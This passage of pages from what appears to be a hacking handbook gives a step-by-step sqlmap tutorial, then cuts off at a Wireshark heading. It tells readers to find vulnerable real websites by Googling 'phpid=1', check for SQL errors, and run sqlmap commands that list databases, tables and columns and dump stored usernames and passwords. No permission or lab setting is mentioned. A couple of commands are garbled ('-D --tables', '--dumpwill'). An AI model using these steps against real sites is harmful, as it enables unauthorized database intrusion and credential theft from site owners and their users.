  - "[PAGE 135]\n\n# Hacking a vulnerable website with PHP, MYSQL using Sqlmap\n\n\
    ![](img/c6b688dca6570d17db3036b560ef0905_135_0.png)\n\nSqlmap is an open source\
    \ penetration testing tool that automates the process of detecting and exploiting\
    \ SQL injection flaws and taking over of database servers. It comes with a powerful\
    \ detection engine, many niche features for the ultimate penetration tester and\
    \ a broad range of switches lasting from database fingerprinting, over data fetching\
    \ from the database, to accessing the underlying file system and executing commands\
    \ on the operating system via out-of-band connections.\n\nBelow example shows\
    \ how to hack a vulnerable website using Sqlmap.\n\n+   * You can find a vulnerable\
    \ website by Googling something like \"phpid=1\"\n  * To make sure that the site\
    \ is vulnerable, add ' ' character at the end of the url and see if it comes up\
    \ with a SQL error\n  * If it does, you can start working on that website\n* On\
    \ this example, the vulnerable url is http://www.domain.com/page.php?id=1\n* On\
    \ Kali we will use sqlmap to analyse the vulnerability\n* Below command will give\
    \ you a list of all databases on that host\n  * sqlmap -u http://www.domain.com/page.php?id=1\
    \ --dbs\n* Next you can get a list of all tables for a particular database (www\
    \ DB in the below example)\n  * sqlmap -u http://www.domain.com/page.php?id=1\
    \ -D --tables"
  - "[PAGE 136]\n\n+   Choose your table, e.g. tbl_users, tbl_login, etc and use the\
    \ below command to get the columns available on that table.\n  sqlmap -u http://www.domain.com/page.php?id=1\
    \ -D www -T tbl_login --columns\n\n+   You might see columns like username, login,\
    \ password, etc. Try the below command to get the records on that columns, for\
    \ instance all records in username column of www database and tbl_login table\n\
    \  sqlmap -u http://www.domain.com/page.php?id=1 -D www -T tbl_login -C username\
    \ --dumpwill\n\n+   To get a list of passwords available on table tbl_login try\
    \ to list the password column of that database\n  sqlmap -u http://www.domain.com/page.php?id=1\
    \ -D www -T tbl_login -C password --dump\n\n+   You should have a list of usernames\
    \ and passwords now."
  - "[PAGE 137]\n\n# Wireshark protocol analyser\n\n![](img/c6b688dca6570d17db3036b560ef0905_137_0.png)\n\
